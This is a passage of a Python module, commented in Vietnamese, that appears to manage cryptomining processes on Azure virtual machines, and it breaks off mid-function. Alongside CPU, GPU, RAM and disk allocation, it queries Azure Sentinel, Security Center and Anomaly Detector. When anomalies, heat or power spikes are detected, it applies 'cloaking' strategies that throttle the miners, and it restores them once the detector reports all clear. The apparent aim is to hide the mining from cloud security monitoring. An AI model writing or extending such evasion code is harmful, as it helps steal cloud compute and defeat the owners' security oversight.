# resource_manager.py

import os
import logging
import subprocess
import psutil
import pynvml
from time import sleep, time
from pathlib import Path
from queue import PriorityQueue, Empty, Queue
from threading import Event, Thread, Lock
from typing import List, Any, Dict, Optional
from readerwriterlock import rwlock

from .base_manager import BaseManager
from .utils import MiningProcess
from .cloak_strategies import CloakStrategyFactory

from .azure_clients import (
    AzureMonitorClient,
    AzureSentinelClient,
    AzureLogAnalyticsClient,
    AzureSecurityCenterClient,
    AzureNetworkWatcherClient,
    AzureTrafficAnalyticsClient,
    AzureMLClient,
    AzureAnomalyDetectorClient,  # Thêm client mới
    AzureOpenAIClient            # Thêm client mới
)

from .auxiliary_modules import temperature_monitor

from .auxiliary_modules.power_management import (
    get_cpu_power,
    get_gpu_power,
    set_gpu_usage,
    shutdown_power_management
)


# ----------------------------
# Hàm thay thế assign_process_to_cgroups
# ----------------------------
def assign_process_resources(pid: int, resources: Dict[str, Any], process_name: str, logger: logging.Logger):
    """
    Hàm thay thế cho assign_process_to_cgroups, áp dụng các điều chỉnh tài nguyên thông qua 
    các cơ chế hệ thống hoặc ghi log cảnh báo nếu không thể áp dụng tương đương.

    Args:
        pid (int): PID của tiến trình cần điều chỉnh.
        resources (Dict[str, Any]): Từ điển chứa các tham số cần điều chỉnh, ví dụ:
            {
                'cpu_threads': int,
                'memory': int (MB),
                'cpu_freq': int (MHz),
                'disk_io_limit_mbps': float,
                ...
            }
        process_name (str): Tên tiến trình.
        logger (logging.Logger): Logger để ghi nhận log.
    """

    # Điều chỉnh CPU threads bằng taskset (Linux)
    if 'cpu_threads' in resources:
        try:
            cpu_count = psutil.cpu_count(logical=True)
            desired_threads = resources['cpu_threads']
            if desired_threads > cpu_count or desired_threads <= 0:
                logger.warning(f"Số luồng CPU yêu cầu ({desired_threads}) không hợp lệ. Bỏ qua.")
            else:
                # Lấy danh sách CPU cores từ 0 đến desired_threads-1
                cores = ",".join(map(str, range(desired_threads)))
                subprocess.run(['taskset', '-cp', cores, str(pid)], check=True)
                logger.info(f"Đã áp dụng giới hạn {desired_threads} luồng CPU cho tiến trình {process_name} (PID: {pid}).")
        except Exception as e:
            logger.error(f"Lỗi khi điều chỉnh luồng CPU bằng taskset cho {process_name} (PID: {pid}): {e}")

    # Điều chỉnh RAM allocation: Không có cgroup, chỉ ghi log
    if 'memory' in resources:
        logger.warning(f"Không thể giới hạn RAM cho tiến trình {process_name} (PID: {pid}) do không có cgroup_manager. Bỏ qua.")

    # Điều chỉnh CPU frequency: Không có cgroup, chỉ ghi log
    if 'cpu_freq' in resources:
        logger.warning(f"Không thể trực tiếp điều chỉnh tần số CPU cho tiến trình {process_name} (PID: {pid}) mà không sử dụng cgroup. Bỏ qua.")

    # Điều chỉnh Disk I/O limit: Không có cgroup, chỉ ghi log
    if 'disk_io_limit_mbps' in resources:
        logger.warning(f"Không thể trực tiếp điều chỉnh Disk I/O cho tiến trình {process_name} (PID: {pid}) mà không sử dụng cgroup. Bỏ qua.")


# ----------------------------
# SharedResourceManager Class
# ----------------------------

class SharedResourceManager:
    """
    Lớp chứa các hàm điều chỉnh tài nguyên dùng chung.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.config = config
        self.logger = logger
        self.original_resource_limits = {}

    def adjust_cpu_threads(self, pid: int, cpu_threads: int, process_name: str):
        """Điều chỉnh số luồng CPU."""
        try:
            assign_process_resources(pid, {'cpu_threads': cpu_threads}, process_name, self.logger)
            self.logger.info(f"Điều chỉnh số luồng CPU xuống {cpu_threads} cho tiến trình {process_name} (PID: {pid}).")
        except Exception as e:
            self.logger.error(f"Lỗi khi điều chỉnh số luồng CPU cho tiến trình {process_name} (PID: {pid}): {e}")

    def adjust_ram_allocation(self, pid: int, ram_allocation_mb: int, process_name: str):
        """Điều chỉnh giới hạn RAM."""
        try:
            assign_process_resources(pid, {'memory': ram_allocation_mb}, process_name, self.logger)
            self.logger.info(f"Điều chỉnh giới hạn RAM xuống {ram_allocation_mb}MB cho tiến trình {process_name} (PID: {pid}).")
        except Exception as e:
            self.logger.error(f"Lỗi khi điều chỉnh RAM cho tiến trình {process_name} (PID: {pid}): {e}")

    def adjust_gpu_usage(self, process: MiningProcess, gpu_usage_percent: List[float]):
        """Điều chỉnh mức sử dụng GPU."""
        try:
            new_gpu_usage_percent = [
                min(max(gpu + self.config["optimization_parameters"].get("gpu_power_adjustment_step", 10), 0), 100)
                for gpu in gpu_usage_percent
            ]
            set_gpu_usage(process.pid, new_gpu_usage_percent)
            self.logger.info(f"Điều chỉnh mức sử dụng GPU xuống {new_gpu_usage_percent} cho tiến trình {process.name} (PID: {process.pid}).")
        except Exception as e:
            self.logger.error(f"Lỗi khi điều chỉnh mức sử dụng GPU cho tiến trình {process.name} (PID: {process.pid}): {e}")
    
    def adjust_disk_io_limit(self, process: MiningProcess, disk_io_limit_mbps: float):
        """Điều chỉnh giới hạn Disk I/O cho tiến trình."""
        try:
            current_limit = temperature_monitor.get_current_disk_io_limit(process.pid)
            adjustment_step = self.config["optimization_parameters"].get("disk_io_limit_step_mbps", 1)
            if current_limit > disk_io_limit_mbps:
                new_limit = current_limit - adjustment_step
            else:
                new_limit = current_limit + adjustment_step
            new_limit = max(
                self.config["resource_allocation"]["disk_io"]["min_limit_mbps"],
                min(new_limit, self.config["resource_allocation"]["disk_io"]["max_limit_mbps"])
            )
            assign_process_resources(process.pid, {'disk_io_limit_mbps': new_limit}, process.name, self.logger)
            self.logger.info(f"Điều chỉnh giới hạn Disk I/O xuống {new_limit} Mbps cho tiến trình {process.name} (PID: {process.pid}).")
        except Exception as e:
            self.logger.error(f"Lỗi khi điều chỉnh Disk I/O cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def adjust_network_bandwidth(self, process: MiningProcess, bandwidth_limit_mbps: float):
        """Điều chỉnh băng thông mạng cho tiến trình."""
        try:
            self.apply_network_cloaking(process.network_interface, bandwidth_limit_mbps, process)
            self.logger.info(f"Điều chỉnh giới hạn băng thông mạng xuống {bandwidth_limit_mbps} Mbps cho tiến trình {process.name} (PID: {process.pid}).")
        except Exception as e:
            self.logger.error(f"Lỗi khi điều chỉnh Mạng cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def adjust_cpu_frequency(self, pid: int, frequency: int, process_name: str):
        """Điều chỉnh tần số CPU."""
        try:
            assign_process_resources(pid, {'cpu_freq': frequency}, process_name, self.logger)
            self.logger.info(f"Đặt tần số CPU xuống {frequency}MHz cho tiến trình {process_name} (PID: {pid}).")
        except Exception as e:
            self.logger.error(f"Lỗi khi điều chỉnh tần số CPU cho tiến trình {process_name} (PID: {pid}): {e}")

    def adjust_gpu_power_limit(self, pid: int, power_limit: int, process_name: str):
        """Điều chỉnh giới hạn công suất GPU."""
        try:
            pynvml.nvmlInit()
            handle = pynvml.nvmlDeviceGetHandleByIndex(0)  # Giả định chỉ có một GPU
            pynvml.nvmlDeviceSetPowerManagementLimit(handle, power_limit * 1000)
            pynvml.nvmlShutdown()
            self.logger.info(f"Đặt giới hạn công suất GPU xuống {power_limit}W cho tiến trình {process_name} (PID: {pid}).")
        except Exception as e:
            self.logger.error(f"Lỗi khi điều chỉnh công suất GPU cho tiến trình {process_name} (PID: {pid}): {e}")

    def adjust_disk_io_priority(self, pid: int, ionice_class: int, process_name: str):
        """Điều chỉnh ưu tiên Disk I/O."""
        try:
            subprocess.run(['ionice', '-c', str(ionice_class), '-p', str(pid)], check=True)
            self.logger.info(f"Đặt ionice class thành {ionice_class} cho tiến trình {process_name} (PID: {pid}).")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi khi thực hiện ionice: {e}")
        except Exception as e:
            self.logger.error(f"Lỗi khi điều chỉnh ưu tiên Disk I/O cho tiến trình {process_name} (PID: {pid}): {e}")

    def drop_caches(self):
        """Giảm sử dụng cache bằng cách drop_caches."""
        try:
            with open('/proc/sys/vm/drop_caches', 'w') as f:
                f.write('3\n')
            self.logger.info("Đã giảm sử dụng cache bằng cách drop_caches.")
        except Exception as e:
            self.logger.error(f"Lỗi khi giảm sử dụng cache: {e}")

    def apply_network_cloaking(self, interface: str, bandwidth_limit: float, process: MiningProcess):
        """Áp dụng cloaking mạng cho tiến trình."""
        try:
            self.configure_network_interface(interface, bandwidth_limit)
        except Exception as e:
            self.logger.error(f"Lỗi khi áp dụng cloaking mạng cho tiến trình {process.name} (PID: {process.pid}): {e}")
            raise

    def configure_network_interface(self, interface: str, bandwidth_limit: float):
        """Cấu hình giao diện mạng (ví dụ sử dụng tc)."""
        # Nơi để chèn logic thực tế cấu hình QoS/TC nếu cần.
        pass

    def throttle_cpu_based_on_load(self, process: MiningProcess, load_percent: float):
        """Giảm tần số CPU dựa trên mức tải."""
        try:
            if load_percent > 80:
                new_freq = 2000  # MHz
            elif load_percent > 50:
                new_freq = 2500  # MHz
            else:
                new_freq = 3000  # MHz
            self.adjust_cpu_frequency(process.pid, new_freq, process.name)
            self.logger.info(f"Điều chỉnh tần số CPU xuống {new_freq}MHz cho tiến trình {process.name} (PID: {process.pid}) dựa trên tải {load_percent}%.")
        except Exception as e:
            self.logger.error(f"Lỗi khi điều chỉnh tần số CPU dựa trên tải cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """
        Áp dụng một chiến lược cloaking cụ thể cho tiến trình và lưu trạng thái tài nguyên ban đầu.
        """
        try:
            self.logger.debug(f"Đang tạo chiến lược {strategy_name} cho tiến trình {process.name} (PID: {process.pid})")
            strategy = CloakStrategyFactory.create_strategy(strategy_name, self.config, self.logger, self.is_gpu_initialized())
        except Exception as e:
            self.logger.error(f"Không thể tạo chiến lược {strategy_name}: {e}")
            raise

        if strategy:
            try:
                adjustments = strategy.apply(process)
                if adjustments:
                    self.logger.info(f"Áp dụng điều chỉnh {strategy_name} cho tiến trình {process.name} (PID: {process.pid}): {adjustments}")

                    pid = process.pid
                    if pid not in self.original_resource_limits:
                        self.original_resource_limits[pid] = {}

                    for key, value in adjustments.items():
                        if key == 'cpu_freq':
                            original_freq = self.get_current_cpu_frequency(pid)
                            self.original_resource_limits[pid]['cpu_freq'] = original_freq
                        elif key == 'gpu_power_limit':
                            original_power_limit = self.get_current_gpu_power_limit(pid)
                            self.original_resource_limits[pid]['gpu_power_limit'] = original_power_limit
                        elif key == 'network_bandwidth_limit_mbps':
                            original_bw_limit = self.get_current_network_bandwidth_limit(pid)
                            self.original_resource_limits[pid]['network_bandwidth_limit_mbps'] = original_bw_limit
                        elif key == 'ionice_class':
                            original_ionice_class = self.get_current_ionice_class(pid)
                            self.original_resource_limits[pid]['ionice_class'] = original_ionice_class
                        # ... Lưu các giới hạn khác tương tự

                    self.execute_adjustments(adjustments, process)
                else:
                    self.logger.warning(f"Không có điều chỉnh nào được áp dụng cho chiến lược {strategy_name} cho tiến trình {process.name} (PID: {process.pid}).")
            except Exception as e:
                self.logger.error(f"Lỗi khi áp dụng chiến lược cloaking {strategy_name} cho tiến trình {process.name} (PID: {process.pid}): {e}")
                raise
        else:
            warning_message = f"Chiến lược cloaking {strategy_name} không được tạo thành công cho tiến trình {process.name} (PID: {process.pid})."
            self.logger.warning(warning_message)
            raise RuntimeError(warning_message)

    def restore_resources(self, process: MiningProcess):
        """
        Khôi phục tài nguyên cho tiến trình sau khi đã xác nhận an toàn từ AnomalyDetector.
        """
        try:
            pid = process.pid
            process_name = process.name
            original_limits = self.original_resource_limits.get(pid)
            if not original_limits:
                self.logger.warning(f"Không tìm thấy giới hạn tài nguyên ban đầu cho tiến trình {process_name} (PID: {pid}).")
                return

            cpu_freq = original_limits.get('cpu_freq')
            if cpu_freq:
                self.adjust_cpu_frequency(pid, cpu_freq, process_name)
                self.logger.info(f"Đã khôi phục tần số CPU về {cpu_freq}MHz cho tiến trình {process_name} (PID: {pid}).")

            cpu_threads = original_limits.get('cpu_threads')
            if cpu_threads:
                self.adjust_cpu_threads(pid, cpu_threads, process_name)
                self.logger.info(f"Đã khôi phục số luồng CPU về {cpu_threads} cho tiến trình {process_name} (PID: {pid}).")

            ram_allocation_mb = original_limits.get('ram_allocation_mb')
            if ram_allocation_mb:
                self.adjust_ram_allocation(pid, ram_allocation_mb, process_name)
                self.logger.info(f"Đã khôi phục giới hạn RAM về {ram_allocation_mb}MB cho tiến trình {process_name} (PID: {pid}).")

            gpu_power_limit = original_limits.get('gpu_power_limit')
            if gpu_power_limit:
                self.adjust_gpu_power_limit(pid, gpu_power_limit, process_name)
                self.logger.info(f"Đã khôi phục giới hạn công suất GPU về {gpu_power_limit}W cho tiến trình {process_name} (PID: {pid}).")

            ionice_class = original_limits.get('ionice_class')
            if ionice_class:
                self.adjust_disk_io_priority(pid, ionice_class, process_name)
                self.logger.info(f"Đã khôi phục lớp ionice về {ionice_class} cho tiến trình {process_name} (PID: {pid}).")

            network_bandwidth_limit_mbps = original_limits.get('network_bandwidth_limit_mbps')
            if network_bandwidth_limit_mbps:
                self.adjust_network_bandwidth(process, network_bandwidth_limit_mbps)
                self.logger.info(f"Đã khôi phục giới hạn băng thông mạng về {network_bandwidth_limit_mbps} Mbps cho tiến trình {process_name} (PID: {pid}).")

            del self.original_resource_limits[pid]
            self.logger.info(f"Đã khôi phục tất cả tài nguyên cho tiến trình {process_name} (PID: {pid}).")

        except Exception as e:
            self.logger.error(f"Lỗi khi khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid}): {e}")
            raise


# ----------------------------
# ResourceManager Class
# ----------------------------

class ResourceManager(BaseManager):
    """
    Lớp quản lý và điều chỉnh tài nguyên hệ thống, bao gồm phân phối tải động.
    Kế thừa từ BaseManager để sử dụng các phương thức chung.
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        super().__init__(config, logger)
        if hasattr(self, '_initialized') and self._initialized:
            return
        self._initialized = True

        self.config = config
        self.logger = logger

        # Sự kiện để dừng các luồng
        self.stop_event = Event()

        # Read-Write Lock để đồng bộ tài nguyên
        self.resource_lock = rwlock.RWLockFair()

        # Hàng đợi ưu tiên để gửi yêu cầu điều chỉnh tài nguyên
        self.resource_adjustment_queue = PriorityQueue()

        # Hàng đợi để nhận yêu cầu cloaking từ AnomalyDetector
        self.cloaking_request_queue = Queue()

        # Danh sách các tiến trình khai thác
        self.mining_processes = []
        self.mining_processes_lock = rwlock.RWLockFair()

        # Khởi tạo các client Azure
        self.initialize_azure_clients()

        # Khám phá các tài nguyên Azure
        self.discover_azure_resources()

        # Khởi tạo các luồng quản lý tài nguyên
        self.initialize_threads()

        # Khởi tạo SharedResourceManager
        self.shared_resource_manager = SharedResourceManager(config, logger)

    def start(self):
        """Khởi động ResourceManager và các luồng quản lý tài nguyên."""
        self.logger.info("Bắt đầu ResourceManager...")
        self.discover_mining_processes()
        self.start_threads()
        self.logger.info("ResourceManager đã khởi động thành công.")

    def stop(self):
        """Dừng ResourceManager và giải phóng tài nguyên."""
        self.logger.info("Dừng ResourceManager...")
        self.stop_event.set()
        self.join_threads()
        self.shutdown_power_management()
        self.logger.info("ResourceManager đã dừng thành công.")

    def initialize_threads(self):
        """Khởi tạo các luồng quản lý tài nguyên."""
        self.monitor_thread = Thread(target=self.monitor_and_adjust, name="MonitorThread", daemon=True)
        self.optimization_thread = Thread(target=self.optimize_resources, name="OptimizationThread", daemon=True)
        self.cloaking_thread = Thread(target=self.process_cloaking_requests, name="CloakingThread", daemon=True)
        self.resource_adjustment_thread = Thread(target=self.resource_adjustment_handler, name="ResourceAdjustmentThread", daemon=True)

    def start_threads(self):
        """Bắt đầu các luồng quản lý tài nguyên."""
        self.monitor_thread.start()
        self.optimization_thread.start()
        self.cloaking_thread.start()
        self.resource_adjustment_thread.start()

    def join_threads(self):
        """Chờ các luồng kết thúc."""
        self.monitor_thread.join()
        self.optimization_thread.join()
        self.cloaking_thread.join()
        self.resource_adjustment_thread.join()

    def initialize_azure_clients(self):
        """Khởi tạo các client Azure."""
        self.azure_monitor_client = AzureMonitorClient(self.logger)
        self.azure_sentinel_client = AzureSentinelClient(self.logger)
        self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
        self.azure_security_center_client = AzureSecurityCenterClient(self.logger)
        self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
        self.azure_traffic_analytics_client = AzureTrafficAnalyticsClient(self.logger)
        self.azure_ml_client = AzureMLClient(self.logger)
        self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config)
        self.azure_openai_client = AzureOpenAIClient(self.logger, self.config)

    def discover_mining_processes(self):
        """Khám phá các tiến trình khai thác dựa trên cấu hình."""
        cpu_process_name = self.config['processes'].get('CPU', '').lower()
        gpu_process_name = self.config['processes'].get('GPU', '').lower()

        with self.mining_processes_lock.gen_wlock():
            self.mining_processes.clear()
            for proc in psutil.process_iter(['pid', 'name']):
                proc_name = proc.info['name'].lower()
                if cpu_process_name in proc_name or gpu_process_name in proc_name:
                    priority = self.get_process_priority(proc.info['name'])
                    network_interface = self.config.get('network_interface', 'eth0')
                    mining_proc = MiningProcess(proc.info['pid'], proc.info['name'], priority, network_interface, self.logger)
                    self.mining_processes.append(mining_proc)
            self.logger.info(f"Khám phá {len(self.mining_processes)} tiến trình khai thác.")

    def get_process_priority(self, process_name: str) -> int:
        """Lấy mức ưu tiên của tiến trình từ cấu hình."""
        priority_map = self.config.get('process_priority_map', {})
        return priority_map.get(process_name.lower(), 1)

    def monitor_and_adjust(self):
        """Luồng để theo dõi và gửi yêu cầu điều chỉnh tài nguyên."""
        monitoring_params = self.config.get("monitoring_parameters", {})
        temperature_check_interval = monitoring_params.get("temperature_monitoring_interval_seconds", 10)
        power_check_interval = monitoring_params.get("power_monitoring_interval_seconds", 10)

        while not self.stop_event.is_set():
            try:
                self.discover_mining_processes()
                self.allocate_resources_with_priority()

                temperature_limits = self.config.get("temperature_limits", {})
                cpu_max_temp = temperature_limits.get("cpu_max_celsius", 75)
                gpu_max_temp = temperature_limits.get("gpu_max_celsius", 85)

                for process in self.mining_processes:
                    self.check_temperature_and_enqueue(process, cpu_max_temp, gpu_max_temp)

                power_limits = self.config.get("power_limits", {})
                cpu_max_power = power_limits.get("per_device_power_watts", {}).get("cpu", 150)
                gpu_max_power = power_limits.get("per_device_power_watts", {}).get("gpu", 300)

                for process in self.mining_processes:
                    self.check_power_and_enqueue(process, cpu_max_power, gpu_max_power)

                if self.should_collect_azure_monitor_data():
                    self.collect_azure_monitor_data()
                    metric_data = self.gather_metric_data_for_anomaly_detection()
                    anomalies_detected = self.azure_anomaly_detector_client.detect_anomalies(metric_data)
                    if anomalies_detected:
                        for process in self.mining_processes:
                            adjustment_task = {
                                'type': 'cloaking',
                                'process': process,
                                'strategies': ['cpu', 'gpu', 'network', 'disk_io', 'cache']
                            }
                            self.resource_adjustment_queue.put((1, adjustment_task))
            except Exception as e:
                self.logger.error(f"Lỗi trong quá trình theo dõi và điều chỉnh: {e}")
            sleep(max(temperature_check_interval, power_check_interval))

    def gather_metric_data_for_anomaly_detection(self) -> Dict[str, Any]:
        data = {}
        with self.mining_processes_lock.gen_rlock():
            for process in self.mining_processes:
                try:
                    proc = psutil.Process(process.pid)
                    data[process.pid] = {
                        'cpu_usage': proc.cpu_percent(interval=None),
                        'ram_usage_mb': proc.memory_info().rss / (1024 * 1024),
                        'gpu_usage_percent': temperature_monitor.get_current_gpu_usage(process.pid) if self.shared_resource_manager.is_gpu_initialized() else 0,
                        'disk_io_mbps': temperature_monitor.get_current_disk_io_limit(process.pid),
                        'network_bandwidth_mbps': self.config.get('resource_allocation', {}).get('network', {}).get('bandwidth_limit_mbps', 100),
                        'cache_limit_percent': self.config.get('resource_allocation', {}).get('cache', {}).get('limit_percent', 50)
                    }
                except psutil.NoSuchProcess:
                    self.logger.warning(f"Tiến trình PID {process.pid} không còn tồn tại.")
                except Exception as e:
                    self.logger.error(f"Lỗi khi thu thập dữ liệu cho PID {process.pid}: {e}")
        return data

    def allocate_resources_with_priority(self):
        with self.resource_lock.gen_wlock(), self.mining_processes_lock.gen_rlock():
            sorted_processes = sorted(self.mining_processes, key=lambda p: p.priority, reverse=True)
            total_cpu_cores = psutil.cpu_count(logical=True)
            allocated_cores = 0

            for process in sorted_processes:
                if allocated_cores >= total_cpu_cores:
                    self.logger.warning(f"Không còn lõi CPU để phân bổ cho tiến trình {process.name} (PID: {process.pid}).")
                    continue

                available_cores = total_cpu_cores - allocated_cores
                cores_to_allocate = min(process.priority, available_cores)
                cpu_threads = cores_to_allocate

                adjustment_task = {
                    'function': 'adjust_cpu_threads',
                    'args': (process.pid, cpu_threads, process.name)
                }
                self.resource_adjustment_queue.put((3, adjustment_task))
                allocated_cores += cores_to_allocate

                if self.shared_resource_manager.is_gpu_initialized() and process.name.lower() == self.config['processes'].get('GPU', '').lower():
                    adjustment_task = {
                        'function': 'adjust_gpu_usage',
                        'args': (process, [])
                    }
                    self.resource_adjustment_queue.put((3, adjustment_task))

                ram_limit_mb = self.config['resource_allocation']['ram'].get('max_allocation_mb', 1024)
                adjustment_task = {
                    'function': 'adjust_ram_allocation',
                    'args': (process.pid, ram_limit_mb, process.name)
                }
                self.resource_adjustment_queue.put((3, adjustment_task))

    def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
        try:
            cpu_temp = temperature_monitor.get_cpu_temperature(process.pid)
            gpu_temp = temperature_monitor.get_gpu_temperature(process.pid) if self.shared_resource_manager.is_gpu_initialized() else 0

            if cpu_temp > cpu_max_temp or gpu_temp > gpu_max_temp:
                adjustments = {}
                if cpu_temp > cpu_max_temp:
                    self.logger.warning(f"Nhiệt độ CPU {cpu_temp}°C của tiến trình {process.name} (PID: {process.pid}) vượt quá {cpu_max_temp}°C.")
                    adjustments['cpu_cloak'] = True
                if gpu_temp > gpu_max_temp:
                    self.logger.warning(f"Nhiệt độ GPU {gpu_temp}°C của tiến trình {process.name} (PID: {process.pid}) vượt quá {gpu_max_temp}°C.")
                    adjustments['gpu_cloak'] = True

                adjustment_task = {
                    'type': 'monitoring',
                    'process': process,
                    'adjustments': adjustments
                }
                self.resource_adjustment_queue.put((2, adjustment_task))
        except Exception as e:
            self.logger.error(f"Lỗi khi kiểm tra nhiệt độ cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def check_power_and_enqueue(self, process: MiningProcess, cpu_max_power: int, gpu_max_power: int):
        try:
            cpu_power = get_cpu_power(process.pid)
            gpu_power = get_gpu_power(process.pid) if self.shared_resource_manager.is_gpu_initialized() else 0

            if cpu_power > cpu_max_power or gpu_power > gpu_max_power:
                adjustments = {}
                if cpu_power > cpu_max_power:
                    self.logger.warning(f"Công suất CPU {cpu_power}W của tiến trình {process.name} (PID: {process.pid}) vượt quá {cpu_max_power}W.")
                    adjustments['cpu_cloak'] = True
                if gpu_power > gpu_max_power:
                    self.logger.warning(f"Công suất GPU {gpu_power}W của tiến trình {process.name} (PID: {process.pid}) vượt quá {gpu_max_power}W.")
                    adjustments['gpu_cloak'] = True

                adjustment_task = {
                    'type': 'monitoring',
                    'process': process,
                    'adjustments': adjustments
                }
                self.resource_adjustment_queue.put((2, adjustment_task))
        except Exception as e:
            self.logger.error(f"Lỗi khi kiểm tra công suất cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def should_collect_azure_monitor_data(self) -> bool:
        if not hasattr(self, '_last_azure_monitor_time'):
            self._last_azure_monitor_time = 0
        current_time = int(time())
        interval = self.config["monitoring_parameters"].get("azure_monitor_interval_seconds", 300)
        if current_time - self._last_azure_monitor_time >= interval:
            self._last_azure_monitor_time = current_time
            return True
        return False

    def collect_azure_monitor_data(self):
        try:
            for vm in self.vms:
                resource_id = vm['id']
                metric_names = ['Percentage CPU', 'Available Memory Bytes']
                metrics = self.azure_monitor_client.get_metrics(resource_id, metric_names)
                self.logger.info(f"Thu thập chỉ số từ Azure Monitor cho VM {vm['name']}: {metrics}")
        except Exception as e:
            self.logger.error(f"Lỗi khi thu thập dữ liệu Azure Monitor: {e}")

    def optimize_resources(self):
        optimization_interval = self.config.get("monitoring_parameters", {}).get("optimization_interval_seconds", 30)
        while not self.stop_event.is_set():
            try:
                with self.mining_processes_lock.gen_rlock():
                    for process in self.mining_processes:
                        process.update_resource_usage()

                self.allocate_resources_with_priority()

                with self.mining_processes_lock.gen_rlock():
                    for process in self.mining_processes:
                        current_state = self.collect_metrics(process)
                        openai_suggestions = self.azure_openai_client.get_optimization_suggestions(current_state)

                        if not openai_suggestions:
                            self.logger.warning(f"Không nhận được gợi ý từ Azure OpenAI cho tiến trình {process.name} (PID: {process.pid}).")
                            continue

                        recommended_action = openai_suggestions
                        self.logger.debug(f"Hành động tối ưu (Azure OpenAI) cho tiến trình {process.name} (PID: {process.pid}): {recommended_action}")

                        adjustment_task = {
                            'type': 'optimization',
                            'process': process,
                            'action': recommended_action
                        }
                        self.resource_adjustment_queue.put((2, adjustment_task))
            except Exception as e:
                self.logger.error(f"Lỗi trong quá trình tối ưu hóa tài nguyên: {e}")

            sleep(optimization_interval)

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        metrics = {
            'cpu_usage_percent': psutil.Process(process.pid).cpu_percent(interval=1),
            'memory_usage_mb': psutil.Process(process.pid).memory_info().rss / (1024 * 1024),
            'gpu_usage_percent': temperature_monitor.get_current_gpu_usage(process.pid) if self.shared_resource_manager.is_gpu_initialized() else 0,
            'disk_io_mbps': temperature_monitor.get_current_disk_io_limit(process.pid),
            'network_bandwidth_mbps': self.config.get('resource_allocation', {}).get('network', {}).get('bandwidth_limit_mbps', 100),
            'cache_limit_percent': self.config.get('resource_allocation', {}).get('cache', {}).get('limit_percent', 50)
        }
        return metrics

    def process_cloaking_requests(self):
        while not self.stop_event.is_set():
            try:
                process = self.cloaking_request_queue.get(timeout=1)
                adjustment_task = {
                    'type': 'cloaking',
                    'process': process,
                    'strategies': ['cpu', 'gpu', 'network', 'disk_io', 'cache']
                }
                self.resource_adjustment_queue.put((1, adjustment_task))
                self.cloaking_request_queue.task_done()
            except Empty:
                continue
            except Exception as e:
                self.logger.error(f"Lỗi trong quá trình xử lý yêu cầu cloaking: {e}")

    def resource_adjustment_handler(self):
        while not self.stop_event.is_set():
            try:
                priority, adjustment_task = self.resource_adjustment_queue.get(timeout=1)
                self.execute_adjustment_task(adjustment_task)
                self.resource_adjustment_queue.task_done()
            except Empty:
                continue
            except Exception as e:
                self.logger.error(f"Lỗi trong quá trình xử lý điều chỉnh tài nguyên: {e}")

    def execute_adjustment_task(self, adjustment_task):
        task_type = adjustment_task.get('type')
        if task_type is None:
            function_name = adjustment_task['function']
            args = adjustment_task.get('args', ())
            kwargs = adjustment_task.get('kwargs', {})
            function = getattr(self.shared_resource_manager, function_name, None)
            if function:
                function(*args, **kwargs)
            else:
                self.logger.error(f"Không tìm thấy hàm điều chỉnh tài nguyên: {function_name}")
        else:
            process = adjustment_task['process']
            if task_type == 'cloaking':
                strategies = adjustment_task['strategies']
                for strategy in strategies:
                    self.shared_resource_manager.apply_cloak_strategy(strategy, process)
                self.logger.info(f"Hoàn thành cloaking cho tiến trình {process.name} (PID: {process.pid}).")
            elif task_type == 'optimization':
                action = adjustment_task['action']
                self.apply_recommended_action(action, process)
            elif task_type == 'monitoring':
                adjustments = adjustment_task['adjustments']
                self.apply_monitoring_adjustments(adjustments, process)
            elif task_type == 'restore':
                self.shared_resource_manager.restore_resources(process)
                self.logger.info(f"Đã khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid}).")
            else:
                self.logger.warning(f"Loại nhiệm vụ không xác định: {task_type}")

    def apply_monitoring_adjustments(self, adjustments: Dict[str, Any], process: MiningProcess):
        try:
            if adjustments.get('cpu_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('cpu', process)
            if adjustments.get('gpu_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('gpu', process)
            if adjustments.get('throttle_cpu'):
                load_percent = psutil.cpu_percent(interval=1)
                self.shared_resource_manager.throttle_cpu_based_on_load(process, load_percent)
            self.logger.info(f"Áp dụng điều chỉnh từ MonitorThread cho tiến trình {process.name} (PID: {process.pid}).")
        except Exception as e:
            self.logger.error(f"Lỗi khi áp dụng điều chỉnh từ MonitorThread cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def apply_recommended_action(self, action: List[Any], process: MiningProcess):
        try:
            cpu_threads = int(action[0])
            ram_allocation_mb = int(action[1])
            gpu_usage_percent = []
            gpu_config = self.config.get("resource_allocation", {}).get("gpu", {}).get("max_usage_percent", [])
            if gpu_config:
                gpu_usage_percent = list(action[2:2 + len(gpu_config)])
            disk_io_limit_mbps = float(action[-3])
            network_bandwidth_limit_mbps = float(action[-2])
            cache_limit_percent = float(action[-1])

            adjustment_task = {
                'function': 'adjust_cpu_threads',
                'args': (process.pid, cpu_threads, process.name)
            }
            self.resource_adjustment_queue.put((3, adjustment_task))

            adjustment_task = {
                'function': 'adjust_ram_allocation',
                'args': (process.pid, ram_allocation_mb, process.name)
            }
            self.resource_adjustment_queue.put((3, adjustment_task))

            if gpu_usage_percent:
                adjustment_task = {
                    'function': 'adjust_gpu_usage',
                    'args': (process, gpu_usage_percent)
                }
                self.resource_adjustment_queue.put((3, adjustment_task))
            else:
                self.logger.warning(f"Không có thông tin mức sử dụng GPU để điều chỉnh cho tiến trình {process.name} (PID: {process.pid}).")

            adjustment_task = {
                'function': 'adjust_disk_io_limit',
                'args': (process, disk_io_limit_mbps)
            }
            self.resource_adjustment_queue.put((3, adjustment_task))

            adjustment_task = {
                'function': 'adjust_network_bandwidth',
